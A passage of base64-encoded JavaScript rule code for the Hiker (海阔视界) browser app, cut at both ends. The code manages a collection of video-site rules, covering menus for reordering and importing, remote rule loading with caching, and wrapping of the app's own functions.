ICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgcmV0dXJuICd0b2FzdDovL+W3sicgKyBpbnB1dFxcbiAgICB9KSxcXG4gICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJyxcXG4gICAgZXh0cmE6IHsgbGluZVZpc2libGU6IGZhbHNlIH1cXG59KTtcXG4oZGlzYWJsZUN1c3RvbSA/IFsn5a+85YWl5rW36ZiUJ10gOiBbJ+WQr+eUqC/npoHnlKgnLCAn6YeN5paw5o6S5bqPJywgJ+abtOaUueWbvuaghycsICflr7zlhaXmtbfpmJQnXSkuZm9yRWFjaCgodikgPT4ge1xcbiAgICBlbC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiB2ID09IGVkaXRNb2RlID8gJ+KAnOKAnOKAneKAnScgKyB2LmJvbGQoKS5mb250Y29sb3IoJyMxMmI2NjgnKSA6IHYsXFxuICAgICAgICB1cmw6IHYgPT0gZWRpdE1vZGUgPyAnaGlrZXI6Ly9lbXB0eScgOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKCh2KSA9PiB7XFxuICAgICAgICAgICAgcHV0TXlWYXIoJ2VkaXRNb2RlJywgdilcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICB9LCB2KSxcXG4gICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXG4gICAgfSlcXG59KTtcXG5pZiAoZWRpdE1vZGUgPT0gJ+WvvOWFpea1t+mYlCcpIGVsLnB1c2goe1xcbiAgICB0aXRsZTogJ+WFqOmDqOWvvOWFpScsXFxuICAgIHVybDogJ+a1t+mYlOinhueVjO+/pWhvbWVfcnVsZV91cmzvv6UnICsgKHVybC5zdGFydHNXaXRoKCdoaWtlcjovLycpIHx8IHVybC5zdGFydHNXaXRoKCdmaWxlOi8vJykgPyB1cmwgOiAnaGlrZXI6Ly9maWxlcy9saWJzLycgKyBtZDUodXJsKSArICcuanMnKSxcXG4gICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJyxcXG4gICAgZXh0cmE6IHsgbGluZVZpc2libGU6IGZhbHNlIH1cXG59KTtcXG4oZGlzYWJsZUN1c3RvbSA/IGRhdGEgOiBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJykpLmZvckVhY2goKHYsIGkpID0+IHtcXG4gICAgbGV0IGQgPSB7IHRpdGxlOiB2LnRpdGxlLCBpbWc6IGRhdGFbaV0uaWNvbiB9XFxuICAgIHN3aXRjaCAoZWRpdE1vZGUpIHtcXG4gICAgICAgIGNhc2UgJ+WQr+eUqC/npoHnlKgnOlxcbiAgICAgICAgICAgIGQudGl0bGUgPSAodi52aXNpYmxlID8gJ/Cfn6IgICcgOiAn8J+UtCAgJykgKyBkLnRpdGxlXFxuICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCBydWxlcyA9IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKVxcbiAgICAgICAgICAgICAgICBydWxlc1tpXS52aXNpYmxlID0gIXJ1bGVzW2ldLnZpc2libGVcXG4gICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBKU09OLnN0cmluZ2lmeShydWxlcykpXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICAgICAgfSwgaSlcXG4gICAgICAgICAgICBicmVha1xcbiAgICAgICAgY2FzZSAn6YeN5paw5o6S5bqPJzpcXG4gICAgICAgICAgICBsZXQgc29ydEZsYWcgPSBwYXJzZUludChnZXRNeVZhcignc29ydEZsYWcnLCAnLTEnKSlcXG4gICAgICAgICAgICBkLnRpdGxlID0gKHNvcnRGbGFnID09IGkgPyAn8J+UgyAgJyA6ICcnKSArIGQudGl0bGVcXG4gICAgICAgICAgICBpZiAoc29ydEZsYWcgPT0gLTEpXFxuICAgICAgICAgICAgICAgIGQudXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoaSkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ3NvcnRGbGFnJywgaS50b1N0cmluZygpKVxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6YCJ5oup6KaB56e75Yqo5Yiw55qE5L2N572uJ1xcbiAgICAgICAgICAgICAgICB9LCBpKVxcbiAgICAgICAgICAgIGVsc2VcXG4gICAgICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChvbGRJbmRleCwgbmV3SW5kZXgpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlcyA9IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKVxcbiAgICAgICAgICAgICAgICAgICAgcnVsZXMuc3BsaWNlKG5ld0luZGV4LCAwLCBydWxlcy5zcGxpY2Uob2xkSW5kZXgsIDEpWzBdKVxcbiAgICAgICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBKU09OLnN0cmluZ2lmeShydWxlcykpXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcignc29ydEZsYWcnLCAnLTEnKVxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICAgICAgICAgIH0sIHNvcnRGbGFnLCBpKVxcbiAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICBjYXNlICfmm7TmlLnlm77moIcnOlxcbiAgICAgICAgICAgIGQudXJsID0gJCh2Lmljb24gfHwgJycsICfovpPlhaXmlrDlm77moIflnLDlnYDmiJbpopzoibLku6PnoIHvvJonKS5pbnB1dCgoaSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJylcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0KVxcbiAgICAgICAgICAgICAgICAgICAgcnVsZXNbaV0uaWNvbiA9IGlucHV0XFxuICAgICAgICAgICAgICAgIGVsc2VcXG4gICAgICAgICAgICAgICAgICAgIGRlbGV0ZSBydWxlc1tpXS5pY29uXFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgSlNPTi5zdHJpbmdpZnkocnVsZXMpKVxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgIH0sIGkpXFxuICAgICAgICAgICAgYnJlYWtcXG4gICAgICAgIGNhc2UgJ+WvvOWFpea1t+mYlCc6XFxuICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCBkYXRhID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZGF0YUxvYWQ/cnVsZT0nICsgZ2V0TXlWYXIoJ215Q29sbGVjdGlvbicpLCB0cnVlKVxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3J1bGU6Ly8nICsgYmFzZTY0RW5jb2RlKEpTT04uc3RyaW5naWZ5KGRhdGFbaV0pKVxcbiAgICAgICAgICAgIH0sIGkpXFxuICAgICAgICAgICAgYnJlYWtcXG4gICAgfVxcbiAgICBlbC5wdXNoKGQpXFxufSlcXG5zZXRSZXN1bHQoZWwpXFxuXCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLpobXpnaLovb3lhaVcIixcInBhdGhcIjpcImZyYW1lTG9hZFwiLFwicnVsZVwiOlwianM6XFxuY29uc3QgUUlOR19USVRMRSA9IGdldE15VmFyKCdteUNvbGxlY3Rpb24nKVxcbnZhciBteUNvbGxfZWwgPSBbXVxcbmV2YWwoSlNPTi5wYXJzZShmZXRjaCgnaGlrZXI6Ly9wYWdlL2hpamFja0Vudj9ydWxlPScgKyBRSU5HX1RJVExFKSkucnVsZSlcXG5cXG5pZiAoIWlzSW5kZXgpIHtcXG4gICAgaWYgKHBhZ2VUaXRsZSkgc2V0UGFnZVRpdGxlKHBhZ2VUaXRsZSlcXG4gICAgc2V0TGFzdENoYXB0ZXJSdWxlKG9yaVJVTEUubGFzdF9jaGFwdGVyX3J1bGUpXFxuICAgIE1ZX1BBUkFNUyA9IE1ZX1JVTEUucGFyYW1zXFxufSBlbHNlIGlmIChNWV9QQUdFID09IDEpIHtcXG4gICAgdGFiSGVhZGVyLmxvYWQobXlDb2xsX2VsKVxcbiAgICBpZiAoUlVMRS5zZWFyY2hfdXJsKSBteUNvbGxfZWwucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIuaQnOe0olxcXCIsXFxuICAgICAgICBkZXNjOiBcXFwi6L+Z5piv6L275ZCI6ZuG55qE5pCc57Si5ZOmfn5cXFwiLFxcbiAgICAgICAgdXJsOiAnXFxcImhpa2VyOi8vc2VhcmNoP3M9XFxcIitpbnB1dCcsXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgIHJ1bGVzOiAkLnRvU3RyaW5nKChRSU5HX1RJVExFLCB0aXRsZSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9kYXRhTG9hZD9ydWxlPScgKyBRSU5HX1RJVExFKVxcbiAgICAgICAgICAgICAgICBydWxlcyA9IFtydWxlcy5maW5kKCh2KSA9PiB2LnRpdGxlID09IHRpdGxlKV1cXG4gICAgICAgICAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHJ1bGVzKVxcbiAgICAgICAgICAgIH0sIFFJTkdfVElUTEUsIFJVTEUudGl0bGUpLFxcbiAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTogZ2V0TXlWYXIoJ3NlYXJjaEtleScsICcnKSxcXG4gICAgICAgICAgICBvbkNoYW5nZTogXFxcInB1dE15VmFyKCdzZWFyY2hLZXknLGlucHV0KVxcXCJcXG4gICAgICAgIH0sXFxuICAgICAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgfSlcXG59XFxuLy8g5q2j5paH6Kej5p6QXFxudmFyIHtcXG4gICAgcGFyYW1IYW5kbGUsXFxuICAgIHJ1blByZVJ1bGUsXFxuICAgIGdlbkV4VXJsLFxcbiAgICBoaWphY2tMYXp5UnVsZVxcbn0gPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9mdW5jVG9vbHM/cnVsZT0nICsgUUlOR19USVRMRSlcXG5ydW5QcmVSdWxlKG9yaVJVTEUucHJlUnVsZSlcXG5pZiAoTVlfUlVMRS5maW5kX3J1bGUuc3RhcnRzV2l0aCgnanM6JykpIHtcXG4gICAgbGV0IHsgaGlqYWNrRWwgfSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2Z1bmNUb29scz9ydWxlPScgKyBRSU5HX1RJVExFKVxcbiAgICBzZXRSZXN1bHQgPSBmdW5jdGlvbihwYXJhbTAsIHBhcmFtMSwgcGFyYW0yLCBwYXJhbTMpIHtcXG4gICAgICAgIHBhcmFtMSA9IENBTExCQUNLX0tFWVxcbiAgICAgICAgcGFyYW0yID0gTVlfUlVMRVxcbiAgICAgICAgcGFyYW0zID0gTVlfVFlQRVxcbiAgICAgICAgaWYgKEFycmF5LmlzQXJyYXkocGFyYW0wLmRhdGEpKSBwYXJhbTAgPSBwYXJhbTAuZGF0YVxcbiAgICAgICAgQXJyYXkucHJvdG90eXBlLnB1c2guYXBwbHkobXlDb2xsX2VsLCBwYXJhbTAubWFwKGhpamFja0VsKSlcXG4gICAgICAgIG1ldGhvZF9zZXRSZXN1bHQuaW52b2tlKGphdmFDb250ZXh0LCBteUNvbGxfZWwsIHBhcmFtMSwgcGFyYW0yLCBwYXJhbTMpXFxuICAgIH1cXG4gICAgc2V0SG9tZVJlc3VsdCA9IHNldFJlc3VsdFxcbiAgICBzZXRTZWFyY2hSZXN1bHQgPSBzZXRSZXN1bHRcXG5cXG4gICAgZXZhbChNWV9SVUxFLmZpbmRfcnVsZS5zbGljZSgzKSlcXG59IGVsc2Uge1xcbiAgICBsZXQgeyBydW5Db2RlIH0gPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9mdW5jVG9vbHM/cnVsZT0nICsgUUlOR19USVRMRSksXFxuICAgICAgICBbXywgZmluZFJ1bGUsIGRldGFpbEZpbmRSdWxlXSA9IE1ZX1JVTEUuZmluZF9ydWxlLm1hdGNoKC9eKFtcXFxcc1xcXFxTXSo/KSg/Oj09PihbXFxcXHNcXFxcU10qKSk/JC8pXFxuICAgIGZpbmRSdWxlID0gZmluZFJ1bGUuc3BsaXQoJzsnKVxcbiAgICBwYXJzZURvbUZvckFycmF5KGdldFJlc0NvZGUoKSwgZmluZFJ1bGUuc2hpZnQoKSkuZm9yRWFjaCgoZGF0YSkgPT4ge1xcbiAgICAgICAgbGV0IFt0aXRsZSwgaW1nLCBkZXNjLCB1cmxdID0gZmluZFJ1bGUubWFwKCh2LCBpKSA9PiB7XFxuICAgICAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICAgICAgICBpZiAodiA9PSAnKicpIHJldHVybiAnJ1xcbiAgICAgICAgICAgICAgICAgICAgZWxzZSB2ID0gKGkgPT0gMSB8fCBpID09IDMpID9cXG4gICAgICAgICAgICAgICAgICAgICAgICBwYXJzZURvbShkYXRhLCB2KSA6XFxuICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VEb21Gb3JIdG1sKGRhdGEsIHYpXFxuICAgICAgICAgICAgICAgICAgICBpZiAoaSAhPSAzKSB2ID0gcnVuQ29kZSh2KVxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHZcXG4gICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgeyByZXR1cm4gJycgfVxcbiAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgIHJlcyA9IHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRpdGxlLCB1cmw6IHVybCxcXG4gICAgICAgICAgICAgICAgZGVzYzogZGVzYywgaW1nOiBpbWcsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBNWV9SVUxFLmNvbF90eXBlXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgaWYgKHJlcy51cmwpIHtcXG4gICAgICAgICAgICBpZiAocmVzLnVybC5pbmNsdWRlcygnQGxhenlSdWxlPScpKSB7XFxuICAgICAgICAgICAgICAgIGxldCByZUluZGV4ID0gcmVzLnVybC5pbmRleE9mKCcuanM6JylcXG4gICAgICAgICAgICAgICAgaWYgKHJlSW5kZXggPj0gMCkgcmVzLnVybCA9IHJlcy51cmwuc2xpY2UoMCwgcmVJbmRleCkgKyAnLmpzOicgKyBoaWphY2tMYXp5UnVsZSArICc7JyArIHJlcy51cmwuc2xpY2UocmVJbmRleCArIDQpXFxuICAgICAgICAgICAgfSBlbHNlICBpZiAoZGV0YWlsRmluZFJ1bGUpIHtcXG4gICAgICAgICAgICAgICAgcmVzLmV4dHJhID0ge1xcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBnZW5FeFVybCh1cmwpLFxcbiAgICAgICAgICAgICAgICAgICAgUlVMRTogYmFzZTY0RW5jb2RlKEpTT04uc3RyaW5naWZ5KE9iamVjdC5hc3NpZ24oZ2VuTXlSdWxlKCksIHsgZGV0YWlsX2ZpbmRfcnVsZTogZGV0YWlsRmluZFJ1bGUgfSkpKSxcXG4gICAgICAgICAgICAgICAgICAgIHBhZ2VUaXRsZTogaXNJbmRleCAmJiB0aXRsZVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIHJlcy51cmwgPSAnaGlrZXI6Ly9wYWdlL2ZyYW1lTG9hZD9ydWxlPScgKyBRSU5HX1RJVExFXFxuICAgICAgICAgICAgfSBlbHNlIGlmIChNWV9SVUxFLmRldGFpbF9maW5kX3J1bGUpIHtcXG4gICAgICAgICAgICAgICAgcmVzLmV4dHJhID0ge1xcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBnZW5FeFVybCh1cmwpLFxcbiAgICAgICAgICAgICAgICAgICAgUlVMRTogYmFzZTY0RW5jb2RlKEpTT04uc3RyaW5naWZ5KGdlbk15UnVsZSgpKSksXFxuICAgICAgICAgICAgICAgICAgICBwYWdlVGl0bGU6IGlzSW5kZXggJiYgdGl0bGVcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICByZXMudXJsID0gJ2hpa2VyOi8vcGFnZS9mcmFtZUxvYWQ/cnVsZT0nICsgUUlOR19USVRMRVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgICAgIG15Q29sbF9lbC5wdXNoKHJlcylcXG4gICAgfSlcXG4gICAgc2V0UmVzdWx0KG15Q29sbF9lbClcXG59XFxuXCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLmlbDmja7ovb3lhaVcIixcInBhdGhcIjpcImRhdGFMb2FkXCIsXCJydWxlXCI6XCJsZXQgc2hvd0FsbCA9ICQuaW1wb3J0UGFyYW0sXFxuICAgIHVybCA9IGdldE15VmFyKCdyZW1vdGVVcmwnKSxcXG4gICAgZGF0YSA9IFtdXFxuaWYgKHVybC5zdGFydHNXaXRoKCdoaWtlcjovLycpIHx8IHVybC5zdGFydHNXaXRoKCdmaWxlOi8vJykpIHtcXG4gICAgLy8g5aaC5p6c5Li65pys5Zyw5paH5Lu25YiZ5LiN6L+b6KGM57yT5a2YXFxuICAgIHRyeSB7XFxuICAgICAgICBsZXQgb3JpRGF0YSA9IGZldGNoKHVybClcXG4gICAgICAgIGlmICh1cmwuc3RhcnRzV2l0aCgnaGlrZXI6Ly9wYWdlLycpKVxcbiAgICAgICAgICAgIG9yaURhdGEgPSBKU09OLnBhcnNlKG9yaURhdGEpLnJ1bGVcXG4gICAgICAgIGRhdGEgPSBKU09OLnBhcnNlKG9yaURhdGEpXFxuICAgIH0gY2F0Y2ggKGUpIHt9XFxufSBlbHNlIHtcXG4gICAgLy8g6I635Y+W6L+c56iL5pWw5o2u77yM5qOA5p+l6Ze06ZqU6buY6K6k5LiA5aSpXFxuICAgIGxldCBpbnRlcnZhbCA9IHBhcnNlSW50KHJlYWRGaWxlKCd1cGRhdGVJbnRlcnZhbCcpIHx8ICcxJyksXFxuICAgICAgICBvbGREYXRhID0gZmV0Y2goJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJyksXFxuICAgICAgICByZW1vdGVEYXRhID0gW11cXG4gICAgaWYgKGludGVydmFsID09IDApIGludGVydmFsID0gLTFcXG4gICAgdHJ5IHsgcmVtb3RlRGF0YSA9IEpTT04ucGFyc2UoZmV0Y2hDYWNoZSh1cmwsIDI0ICogaW50ZXJ2YWwsIHsgdGltZW91dDogNTAwMDAgfSkpIH0gY2F0Y2ggKGUpIHt9XFxuICAgIGlmICghQXJyYXkuaXNBcnJheShyZW1vdGVEYXRhKSkgcmVtb3RlRGF0YSA9IFtdXFxuICAgIGlmIChyZW1vdGVEYXRhLmxlbmd0aCA8IDMpIHtcXG4gICAgICAgIGxvZygn5pyq6I635Y+W5Yiw5pWw5o2uJylcXG4gICAgICAgIGlmIChvbGREYXRhKSB3cml0ZUZpbGUoJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJywgb2xkRGF0YSlcXG4gICAgICAgIGRhdGEgPSBKU09OLnBhcnNlKG9sZERhdGEgfHwgJ1tdJylcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIGxvZygn5bey6I635Y+W5Yiw5pWw5o2uJylcXG4gICAgICAgIGRhdGEgPSByZW1vdGVEYXRhXFxuICAgIH1cXG59XFxuZGF0YSA9IGRhdGEuZmlsdGVyKCh2KSA9PiB2LnRpdGxlICE9IGdldE15VmFyKCdteUNvbGxlY3Rpb24nKSAmJiAhKHYuYXV0aG9yIHx8ICcnKS5pbmNsdWRlcygn6L275ZCI6ZuG55Sf5oiQ5ZmoJykpXFxuaWYgKHJlYWRGaWxlKCdkaXNhYmxlQ3VzdG9tJykpICQuZXhwb3J0cyA9IGRhdGFcXG5lbHNlIHsgLy8g5YaZ5YWl6Ieq5a6a5LmJ5pWw5o2uXFxuICAgIGxldCBjdXN0b21EYXRhID0gSlNPTi5wYXJzZShyZWFkRmlsZSgnY3VzdG9tRGF0YScpIHx8ICdbXScpLFxcbiAgICAgICAgcmV3cml0ZURhdGEgPSBbXVxcbiAgICBjdXN0b21EYXRhID0gY3VzdG9tRGF0YS5yZWR1Y2UoKHNlbGYsIHYpID0+IHtcXG4gICAgICAgIGxldCBpbmRleCA9IGRhdGEuZmluZEluZGV4KCh2dikgPT4gdi50aXRsZSA9PSB2di50aXRsZSlcXG4gICAgICAgIGlmIChpbmRleCA+PSAwKSB7XFxuICAgICAgICAgICAgc2VsZi5wdXNoKHYpXFxuICAgICAgICAgICAgbGV0IHJ1bGUgPSBkYXRhLnNwbGljZShpbmRleCwgMSlbMF1cXG4gICAgICAgICAgICBpZiAoc2hvd0FsbCB8fCB2LnZpc2libGUpXFxuICAgICAgICAgICAgICAgIHJld3JpdGVEYXRhLnB1c2goT2JqZWN0LmFzc2lnbihydWxlLCB2KSlcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiBzZWxmXFxuICAgIH0sIFtdKVxcbiAgICBkYXRhLmZvckVhY2goKHYpID0+IGN1c3RvbURhdGEucHVzaCh7IHRpdGxlOiB2LnRpdGxlLCB2aXNpYmxlOiB0cnVlIH0pKVxcbiAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIEpTT04uc3RyaW5naWZ5KGN1c3RvbURhdGEpKVxcbiAgICAkLmV4cG9ydHMgPSByZXdyaXRlRGF0YS5jb25jYXQoZGF0YSlcXG59XFxuXCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLnjq/looPliqvmjIFcIixcInBhdGhcIjpcImhpamFja0VudlwiLFwicnVsZVwiOlwidmFyIHsgUlVMRSwgaXNJbmRleCwgcGFnZVRpdGxlIH0gPSBNWV9QQVJBTVNcXG5SVUxFID0gSlNPTi5wYXJzZShiYXNlNjREZWNvZGUoUlVMRSkpXFxudmFyIG9yaVJVTEUgPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9kYXRhTG9hZD9ydWxlPScgKyBRSU5HX1RJVExFKS5maW5kKCh2KSA9PiB2LnRpdGxlID09IFJVTEUudGl0bGUpXFxuaWYgKGlzSW5kZXgpIHtcXG4gICAgUlVMRSA9IG9yaVJVTEVcXG4gICAgdmFyIHsgdGFiSGVhZGVyLCBmeUFsbCB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvQ2xhc3NUYWI/cnVsZT0nICsgUUlOR19USVRMRSwgT2JqZWN0LmFzc2lnbih7IFFJTkdfVElUTEU6IFFJTkdfVElUTEUgfSwgUlVMRSkpXFxuICAgIC8vIOWkhOeQhk1ZX1JVTEVcXG4gICAgTVlfUlVMRS5jbGFzc191cmwgPSB0YWJIZWFkZXIuZ2V0Q2xhc3MoZnlBbGwgPyAnZnlBbGwnIDogJ2Z5Y2xhc3MnKS51cmxcXG4gICAgTVlfUlVMRS5hcmVhX3VybCA9IGZ5QWxsID8gTVlfUlVMRS5jbGFzc191cmwgOiB0YWJIZWFkZXIuZ2V0Q2xhc3MoJ2Z5YXJlYScpLnVybFxcbiAgICBNWV9SVUxFLnllYXJfdXJsID0gZnlBbGwgPyBNWV9SVUxFLmNsYXNzX3VybCA6IHRhYkhlYWRlci5nZXRDbGFzcygnZnl5ZWFyJykudXJsXFxuICAgIE1ZX1JVTEUuc29ydF91cmwgPSBmeUFsbCA/IE1ZX1JVTEUuY2xhc3NfdXJsIDogdGFiSGVhZGVyLmdldENsYXNzKCdmeXNvcnQnKS51cmxcXG4gICAgTVlfUlVMRS51cmwgPSBSVUxFLnVybFxcbiAgICBNWV9SVUxFLmNvbF90eXBlID0gUlVMRS5jb2xfdHlwZVxcbiAgICBNWV9SVUxFLmRldGFpbF9jb2xfdHlwZSA9IFJVTEUuZGV0YWlsX2NvbF90eXBlXFxuICAgIE1ZX1JVTEUuZmluZF9ydWxlID0gUlVMRS5maW5kX3J1bGVcXG4gICAgTVlfUlVMRS5kZXRhaWxfZmluZF9ydWxlID0gUlVMRS5kZXRhaWxfZmluZF9ydWxlXFxuICAgIE1ZX1JVTEUucGFyYW1zID0ge31cXG59IGVsc2Uge1xcbiAgICBSVUxFLnBhZ2VzID0gb3JpUlVMRS5wYWdlc1xcbiAgICAvLyDlpITnkIZNWV9SVUxFXFxuICAgIE1ZX1JVTEUudXJsID0gTVlfUEFSQU1TLnVybFxcbiAgICBNWV9SVUxFLmNvbF90eXBlID0gUlVMRS5kZXRhaWxfY29sX3R5cGVcXG4gICAgTVlfUlVMRS5maW5kX3J1bGUgPSBSVUxFLmRldGFpbF9maW5kX3J1bGVcXG4gICAgTVlfUlVMRS5wYXJhbXMgPSBSVUxFLnBhcmFtc1xcbn1cXG5NWV9SVUxFLnBhZ2VzID0gUlVMRS5wYWdlc1xcbk1ZX1JVTEUucGFnZUxpc3QgPSBKU09OLnBhcnNlKE1ZX1JVTEUucGFnZXMgfHwgJ1tdJylcXG5NWV9SVUxFLnRpdGxlID0gUlVMRS50aXRsZVxcbk1ZX1JVTEUudWEgPSBSVUxFLnVhXFxubG9nKE1ZX1JVTEUudXJsKVxcbi8vIOi9veWFpeWHveaVsOW3peWFt1xcbnZhciB7IGdlbk15UnVsZSB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZnVuY1Rvb2xzP3J1bGU9JyArIFFJTkdfVElUTEUsIHtcXG4gICAgUUlOR19USVRMRTogUUlOR19USVRMRSxcXG4gICAgTVlfUlVMRTogTVlfUlVMRSxcXG4gICAgaXNJbmRleDogaXNJbmRleFxcbn0pXFxuLy8g6Ziy5q2icmVxdWlyZeWkmuasoei/kOihjFxcbmNvbnN0IG15Q29sbF9yZXF1aXJlZCA9IHt9XFxucmVxdWlyZSA9IGZ1bmN0aW9uKHBhcmFtMCwgcGFyYW0xLCBwYXJhbTIsIHBhcmFtMywgcGFyYW00KSB7XFxuICAgIGlmIChteUNvbGxfcmVxdWlyZWRbcGFyYW0wXSkgcmV0dXJuXFxuICAgIG15Q29sbF9yZXF1aXJlZFtwYXJhbTBdID0gdHJ1ZVxcbiAgICBwYXJhbTIgPSBwYXJhbTIgIT0gbnVsbCA/IHBhcmFtMiA6IDBcXG4gICAgcGFyYW0zID0gTVlfVElDS0VUXFxuICAgIHBhcmFtNCA9IGV2YWxcXG4gICAgcmV0dXJuIG1ldGhvZF9yZXF1aXJlLmludm9rZShqYXZhQ29udGV4dCwgcGFyYW0wLCBwYXJhbTEsIHBhcmFtMiwgcGFyYW0zLCBwYXJhbTQpXFxufVxcbnJlcXVpcmVDYWNoZSA9IGZ1bmN0aW9uKHBhcmFtMCwgcGFyYW0xLCBwYXJhbTIsIHBhcmFtMywgcGFyYW00LCBwYXJhbTUpIHtcXG4gICAgaWYgKG15Q29sbF9yZXF1aXJlZFtwYXJhbTBdKSByZXR1cm5cXG4gICAgbXlDb2xsX3JlcXVpcmVkW3BhcmFtMF0gPSB0cnVlXFxuICAgIHBhcmFtMyA9IHBhcmFtMyAhPSBudWxsID8gcGFyYW0zIDogMFxcbiAgICBwYXJhbTQgPSBNWV9USUNLRVRcXG4gICAgcGFyYW01ID0gZXZhbFxcbiAgICByZXR1cm4gbWV0aG9kX3JlcXVpcmVDYWNoZS5pbnZva2UoamF2YUNvbnRleHQsIHBhcmFtMCwgcGFyYW0xLCBwYXJhbTIsIHBhcmFtMywgcGFyYW00LCBwYXJhbTUpXFxufVxcbnJjID0gcmVxdWlyZUNhY2hlXFxuLy8g5pyA5paw56ug6IqC6KeE5YiZ546v5aKD5Yqr5oyBXFxuc2V0TGFzdENoYXB0ZXJSdWxlID0gZnVuY3Rpb24ocGFyYW0wKSB7XFxuICAgIGlmIChwYXJhbTAuc3RhcnRzV2l0aChcXFwianM6XFxcIikpIHtcXG4gICAgICAgIHBhcmFtMCA9ICdqczonICsgJC50b1N0cmluZygoUUlOR19USVRMRSwgTVlfUEFSQU1TKSA9PiB7XFxuICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKGZldGNoKCdoaWtlcjovL3BhZ2UvaGlqYWNrRW52P3J1bGU9JyArIFFJTkdfVElUTEUpKS5ydWxlKVxcbiAgICAgICAgICAgIHZhciB7IHJ1blByZVJ1bGUgfSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2Z1bmNUb29scz9ydWxlPScgKyBRSU5HX1RJVExFKVxcbiAgICAgICAgICAgIHJ1blByZVJ1bGUob3JpUlVMRS5wcmVSdWxlKVxcbiAgICAgICAg